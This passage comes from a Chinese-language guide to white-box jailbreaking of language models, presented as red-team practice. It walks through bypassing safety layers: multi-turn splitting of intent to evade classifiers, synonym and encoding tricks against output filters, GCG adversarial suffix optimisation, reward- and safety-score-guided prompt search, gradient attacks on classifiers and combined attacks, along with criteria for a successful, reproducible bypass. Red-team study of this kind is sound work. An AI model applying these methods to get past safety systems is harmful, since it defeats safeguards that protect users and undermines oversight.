- 延迟关键决策点，避免一次性触发惩罚

**白盒判断标准：**

- reward 曲线保持稳定
- refusal token 概率不显著上升

**4.2 针对 Safety Classifier**

核心思路是避免单轮语义强触发：

- 多轮上下文拆解
- 语义压缩后逐步展开
- 控制每轮 safety score 累积

**4.3 针对后处理规则**

这是最低成本路径：

- 同义替换
- 编码或结构化表达
- 内容拆分输出

通常属于确定性绕过。

#### 第五阶段：有效性验证

我不会把"输出了一点危险内容"当作成功。

**5.1 成功标准**

- 模型完成了其对齐目标中被明确禁止的能力
- 不是关键词遗漏或规则漏洞

**5.2 稳定性验证**

- 多次复现
- 不依赖随机 seed
- 不依赖异常上下文

>***在白盒条件下，LLM 越狱本质上是一个对齐系统的逆向工程问题。实践中的关键不在于 prompt 技巧，而在于识别安全约束的生效层级、量化安全边界，并通过最小语义偏移绕过模型真正"在意"的惩罚目标。***

### GCG（Greedy Coordinate Gradient）——白盒越狱的"标准武器"

到这里，我们进入一些实际的攻击策略——GCG。

**实践步骤（非常重要）：**

1. 固定一个被禁止的目标任务
2. 构造一个"看似无害"的 base prompt
3. 在 prompt 末尾引入 suffix 变量
4. 定义 loss（如拒绝概率）
5. 反复：计算梯度 → 替换 token
6. 最终得到一个：人类不可读，但高度有效的对抗后缀

### Reward / Safety 曲线引导的语义搜索

不用梯度，直接用 reward / safety score 当"导航仪"。做法是：多版本 prompt → 对比 score 变化 → 朝着 reward 不降、safety 不升的方向移动。

**实践细节：**

- **任务拆分**：每一步保持 reward-neutral
- **语义重写**：抽象化、历史化、评估化
- **延迟触发**：最后一轮才拼接真实意图

白盒优势在于：你能看到"哪一步开始危险"，而不是靠猜。

### Safety Classifier 白盒攻击技术

**梯度反向攻击**

如果安全分类器也是模型，可直接对 classifier loss 反向优化。目标：降低 risk score，保持语义等价。这在白盒中是非常直接的。

**语义解耦攻击**

实践中更常用：把危险语义拆成多轮、多角色、多上下文依赖，让 classifier 单轮看不出问题。

### 系统级组合攻击（白盒高级）

这类方法单点不新，但组合极强：

- GCG suffix + 多轮上下文
- reward 引导 + role shift
- classifier 绕过 + 后处理规避

白盒下你能精确控制：哪一层负责"放行"，哪一层负责"完成任务"。

### 实践总结（技术向）

在白盒条件下，LLM 越狱不再是 prompt 技巧问题，而是一个可优化、可测量、可复现的对抗生成问题。GCG 提供了直接攻击模型内对齐的能力，而 reward / safety 曲线引导方法则更贴近真实红队实践。成熟的白盒测试通常结合两者，用梯度探测边界，用语义路径完成绕过。